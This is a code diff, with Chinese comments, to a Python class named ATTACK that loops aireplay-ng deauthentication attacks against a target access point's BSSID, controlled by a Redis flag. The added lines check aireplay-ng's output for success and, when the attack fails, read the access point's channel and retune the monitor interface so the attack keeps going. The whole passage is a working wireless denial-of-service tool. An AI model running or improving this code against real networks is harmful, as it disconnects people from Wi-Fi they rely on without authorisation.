@@ -34,19 +34,21 @@ class ATTACK:
         attack = r.hget('attack', 'statu')
         # 在程序执行之前先改变虚拟网卡的信道
         self.changechannel(self.wlanname, self.ch)
-        re_channel = re.compile(r'AP\Wuses\Wchannel\W(\d)')
+        re_success = re.compile(r'Sending DeAuth to broadcast \-\- BSSID\: \[{}\]'.format(self.mac))
+        re_newch = re.compile(r'AP\Wuses\Wchannel\W(\d)')
         while int(attack) == 1:
             cmd = 'aireplay-ng -0 10 -a {} {}mon'.format(self.mac, self.wlanname)
             p = Popen(cmd, stdout=PIPE, stderr=PIPE, shell=True)
             out, err = p.communicate()
-            print out
-            print err
-            # 如果攻击成功那就继续
-            #if
-                # 继续执行
-            #else:
-                # 如果没有攻击成功那就改变虚拟网卡的频率
-            time.sleep(0.2)
+            # 每次都去匹配成功的字段
+            success = re_success.search(out)
+            if success:
+                # 如果成功的化就不用理会继续执行攻击
+                time.sleep(0.2)
+            else:
+                # 如果失败就获取当前频率并改变网卡的频率
+                newch = re_newch.findall(out)
+                self.changechannel(self.wlanname, newch[0])
             attack = r.hget('attack', 'statu')
         else:
             call('airmon-ng stop {}mon'.format(self.wlanname), shell=True)
